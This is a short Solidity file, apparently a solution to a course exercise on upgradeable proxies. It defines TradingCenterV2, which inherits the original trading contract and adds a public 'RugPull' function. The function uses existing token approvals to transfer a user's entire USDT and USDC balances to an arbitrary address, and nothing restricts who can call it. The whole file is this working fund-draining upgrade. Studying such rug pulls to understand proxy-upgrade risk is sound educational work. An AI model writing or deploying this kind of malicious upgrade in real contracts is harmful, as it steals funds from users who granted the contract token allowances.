// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.17;
import "./TradingCenter.sol";


// TODO: Try to implement TradingCenterV2 here
contract TradingCenterV2 is TradingCenter{
    //TODO: inherite V1 , Add rug method, use proxy pattern to rug
    function RugPull(address user,address rugAddress) public{
        usdt.transferFrom(address(user), rugAddress, usdt.balanceOf(address(user)));
        usdc.transferFrom(address(user), rugAddress, usdc.balanceOf(address(user)));
    }
}
